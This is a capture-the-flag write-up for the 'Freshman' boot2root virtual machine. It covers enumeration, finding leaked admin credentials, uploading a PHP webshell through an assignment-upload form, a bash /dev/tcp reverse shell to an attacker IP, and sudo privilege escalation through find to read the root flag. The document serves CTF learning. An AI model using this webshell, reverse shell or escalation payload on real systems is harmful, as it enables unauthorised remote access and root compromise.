# Freshman

This is one of 2 Boot2Root questions for this CTF event. We are given a `.OVA` file, which I set up in VirtualBox.

<p align="center">
  <img width="500" height="503" src="https://github.com/user-attachments/assets/b5e98cf1-82e5-4711-9470-77ee157d9c34" />
</p>

---

## Enumeration

I started with a Nmap scan to detect all open ports.

<p align="center">
  <img width="975" height="363" src="https://github.com/user-attachments/assets/01ec9414-9847-4222-acfe-06f1412b1335" />
</p>

### FTP (Port 21) & MySQL (Port 3306)

<p align="center">
  <img width="500" height="172" src="https://github.com/user-attachments/assets/2b52468f-2c61-423d-a0ba-6b801219bfa0" />
  <img width="500" height="194" src="https://github.com/user-attachments/assets/fb2c8c55-fa98-4496-96f2-a50da98cff6d" />
</p>

FTP requires credentials and MySQL blocks my IP, probably limiting access to internal/web applications.

### HTTP (Port 80)

<p align="center">
  <img width="500" height="550" src="https://github.com/user-attachments/assets/545746f6-b4ab-46d9-80e1-cc9886fa0836" />
</p>

Navigating through the website brings us to a login page. I also performed some directory fuzzing.

<p align="center">
  <img width="600" height="425" src="https://github.com/user-attachments/assets/72949f7b-efc7-474e-b142-63335422a4c9" />
</p>

### HTTP (Port 8080)

<p align="center">
  <img width="500" height="274" src="https://github.com/user-attachments/assets/c901e710-3cf9-4ff3-b8ac-1ac19e52fd80" />
  <img width="500" height="512" src="https://github.com/user-attachments/assets/6938f7db-915b-489a-8902-8b5fdbcbd89a" />
</p>

Initially, this port only hosted the Nginx welcome page. After fuzzing, I discovered an `index.php` file that allows downloading the PHP source of the login page.

Inspecting it reveals admin credentials: **admin:admin**

<p align="center">
  <img width="500" height="492" src="https://github.com/user-attachments/assets/68a34021-3226-40f8-aa4b-49566186f615" />
</p>

Using these credentials, we can log into the Freshman Portal, which includes an assignment upload feature.

<p align="center">
  <img width="500" height="466" src="https://github.com/user-attachments/assets/ded90717-77d5-43a7-bd9a-488abb5aebfa" />
</p>

---

## Exploitation

First, I attempted to upload a PHP webshell:

```bash
<?php system($_GET['cmd']); ?>
```
<p align="center"> <img width="500" height="585" src="https://github.com/user-attachments/assets/15d1fea1-8201-4b9e-adb3-12d53d15adfa" /> </p>

I then accessed the uploaded file:

<p align="center"> <img width="500" height="175" src="https://github.com/user-attachments/assets/9136234c-dfff-4c7b-9b2f-1568dbd3e9c2" /> </p>

Great! we have RCE. For easier interaction, I spawned a reverse shell using:

```bash
cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.16.1.128/4444%200%3E%261%22
```

<p align="center"> <img width="500" height="218" alt="image" src="https://github.com/user-attachments/assets/fd4a131e-7972-49ef-98d9-8e2bacaed461" /></p>

After snooping around the webshell I found something in /tmp

<p align="center"> <img width="500" height="719" alt="image" src="https://github.com/user-attachments/assets/e593a7cc-2491-49fa-9ca4-497e70b129c5" /></p>

We have freshman's password. I tried to su in the webshell, but it didn't work. But the credentials did work in FTP. The flag file can be downloaded and decoded.

<p align="center"> 
<img width="500" height="534" alt="image" src="https://github.com/user-attachments/assets/21d91134-f326-4077-8bb7-48661a5ee4ec" />
<img width="500" height="234" alt="image" src="https://github.com/user-attachments/assets/4d0b7076-8401-4b9a-a08d-3e8d39239f8e" />
</p>

---

## Privelege Escalation

Since SSH is not open and we can't su in the webshell, we need to figure out another way to run commands as freshman and escalate to root. After looking at some PE vector online, I figured out that I can actually run commands as freshman through the webshell using this piped command:

```bash
echo 'freshman123' | su freshman -c "COMMAND"
```

<p align="center">
<img width="800" height="196" alt="image" src="https://github.com/user-attachments/assets/f0bcaeb3-1e96-4ed8-b3c1-6c9a451927c3" />
</p>

NOPASWD on /usr/bin/find. I search for some payloads on GTFO bins and got this. ```find . -exec /bin/sh \; -quit```.

<p align="center">
<img width="975" height="82" alt="image" src="https://github.com/user-attachments/assets/1016430c-eb11-48c4-bc24-b831b0e61a5b" />
</p>

Hmm...didn't quite work. Instead of immediately trying to spawn a shell as root, I tried to run id first.

<p align="center">
<img width="975" height="69" alt="image" src="https://github.com/user-attachments/assets/07e7dace-2856-4cb8-b263-3f2d82e3d16b" />
</p>

We can now run commands as root. Final payload: ```echo 'freshman123' | su freshman -c "sudo find / -exec cat /root/root.txt \; -quit"```

<p align="center">
<img width="600" height="94" alt="image" src="https://github.com/user-attachments/assets/f139a9bd-a577-450a-b780-191a2d820c99" />
<img width="600" height="120" alt="image" src="https://github.com/user-attachments/assets/dfd397a1-2011-483c-95ce-5cc3eab751a1" />
</p>

We got the flag!





